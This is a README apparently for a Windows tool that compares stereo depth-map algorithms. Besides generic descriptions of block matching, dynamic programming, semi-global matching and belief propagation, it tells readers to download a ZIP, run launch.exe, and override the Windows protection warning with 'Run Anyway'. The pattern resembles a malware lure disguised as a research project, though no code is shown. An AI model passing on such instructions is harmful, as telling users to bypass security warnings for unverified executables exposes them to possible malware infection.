# 👁️ stereo-algorithms-evolution - Explore depth map generation methods easily

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/hadean-vanualevu194/stereo-algorithms-evolution)

## 📖 About this software

This project helps you understand how computers measure depth using two images of the same scene. Engineers call this process stereo matching. You can see how different methods solve the problem of finding depth by comparing two distinct perspectives.

The software includes basic block matching along with more advanced techniques like dynamic programming and belief propagation. You can use these tools to generate disparity maps from stereo image pairs. A disparity map highlights the distance between objects in a scene. Darker areas indicate objects far away, while brighter areas show objects close to the camera.

Each algorithm in this collection demonstrates a specific stage in the evolution of computer vision technology. By testing them side-by-side, you see how accuracy improves as the methods grow in complexity.

## 🛠️ How this works

Computers view depth by comparing two images taken from slightly different positions. The software looks for matching patterns in both images. When it finds a match, it calculates the horizontal shift, known as disparity. High disparity equals low distance.

The repository provides several implementations:

- Block Matching: This method compares small pixel areas in both images. It works fast but lacks precision on smooth surfaces.
- Dynamic Programming: This approach scans entire image rows at once. It helps when the block matching method fails to find a clear link between images.
- Semi-Global Matching: This technique combines row-based scanning with vertical checks to lower the appearance of noise.
- Belief Propagation: This advanced method treats the image as a grid of connected pixels. It uses internal logic to smooth out edges and improve overall map quality.

## 🖥️ System requirements

This application runs on modern Windows computers. Ensure your system meets these basic specs:

- Windows 10 or 11 operating system.
- An Intel Core i5 or AMD Ryzen 5 processor.
- At least 8 GB of available system memory.
- A display resolution of 1920x1080 or higher.
- OpenCL support on your graphics card (most modern cards support this).

## 📥 Download and installation

Visit the link below to access the software files.

[Download stereo-algorithms-evolution](https://github.com/hadean-vanualevu194/stereo-algorithms-evolution)

Follow these steps to prepare your computer:

1. Click the link above to reach the main page.
2. Look for the green button labeled Code.
3. Choose the option to download the repository as a ZIP file.
4. Save this file to your computer.
5. Open your downloads folder.
6. Right-click the file and select Extract All.
7. Choose your desktop as the extraction destination.

## 🚀 Running the software

Once you extract the files to your desktop, navigate into the main folder. Look for the file named launch.exe. Double-click this file to start the application.

If Windows shows a protection message, click More Info, then click Run Anyway. This happens because the application is a self-made tool.

The main window shows a list of algorithms on the left. Click one to select it. Use the open file button to load a pair of stereo images. The software processes the images and displays the resulting disparity map in the center of the window.

## ⚙️ Changing settings

Each algorithm offers unique settings. After you select an algorithm, the right side window displays several sliders. These sliders control variables like search range and smoothing strength.

- Search Range: Determines how far the software looks for a matching pixel. Increase this if your images show objects very close to the camera.
- Smoothing: Adjusts how much the image ignores small errors. High smoothing makes the final map look cleaner but might lose sharp object boundaries.
- Confidence Threshold: Tells the computer to discard matches that look incorrect. Use this to remove hazy artifacts from your result.

## 🔍 Troubleshooting common issues

Most users get the software running on the first try. If you encounter hurdles, check these suggestions:

- Application will not open: Verify that your computer has the latest version of the C++ Redistributable package. You can find this on the official Microsoft website.
- The image appears black: This often means the search range is too low. Move the search range slider to the right to look deeper into the image.
- Program freezes: Stop the current task and try a smaller image size. Very large photos require a significant amount of memory.
- Results look low quality: Try using a different algorithm from the left panel. Block matching is the most prone to errors. Belief propagation produces the highest quality results but takes longer to process.

## 📝 Best practices for image selection

The algorithms work best with high-contrast images. Patterns, textures, and clear edges help the software find pixel matches. Avoid uploading images with large, featureless areas. A plain white wall makes it difficult for the computer to calculate a distance.

If you capture your own images, ensure the two cameras remain level. Keep them exactly parallel to each other. Even a small tilt between the two cameras can ruin the calculation. If you see diagonal lines in your output, realign the two photographs to fix the perspective shift.

## 📦 Organizing your workspace

Keep all your stereo image pairs in a central folder. The program includes a file browser. Keep your source images labeled with clear names like left_view.png and right_view.png. This prevents confusion when loading files into the software.

If you plan to compare algorithms often, consider saving your generated disparity maps in a separate folder. The software creates high-resolution images by default. Saving them to a dedicated location keeps your desktop clean and organized.

## 🌐 Understanding the technology

The field of stereo vision changes quickly. New research improves speed and accuracy every year. This software provides a foundation to see these advances in action. By moving from simple matching methods to complex network-based approaches, you witness how logic helps a computer mimic human depth perception.

Use the provided source code to see how each method functions. While the software runs the math, the code files show exactly how the pixels get processed. This library serves as a starting point for anyone interested in how machines see the world.